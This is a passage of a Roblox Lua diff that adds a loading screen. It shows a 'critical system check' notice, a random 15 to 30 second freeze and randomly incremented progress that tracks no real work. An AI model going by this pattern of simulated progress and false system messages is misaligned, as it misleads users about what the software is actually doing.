+            freezeNotification.Text = "⏳ Critical system check - Please wait 15-30 seconds..."
+            TweenService:Create(freezeNotification, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                 TextTransparency = 0
             }):Play()
-        end)
+            
+            local freezeTime = math.random(15, 30)
+            wait(freezeTime)
+            
+            TweenService:Create(freezeNotification, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+                TextTransparency = 1
+            }):Play()
+            freezeNotification.Text = ""
+        end
+        
+        wait(waitTime)
+        elapsedTime = elapsedTime + waitTime
+        
+        local progressIncrement = hasUsedBoost and math.random(2, 4) or math.random(1, 2)
+        currentProgress = currentProgress + progressIncrement
+        
+        if currentProgress > 100 then currentProgress = 100 end
+        updateProgress(currentProgress)
     end
+    
+    -- Loading complete sequence
+    loadingText.Text = "✅ All systems loaded successfully!"
+    TweenService:Create(loadingText, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+        TextColor3 = Color3.fromRGB(100, 255, 100)
+    }):Play()
     
     -- Loading complete
     wait(1.5)
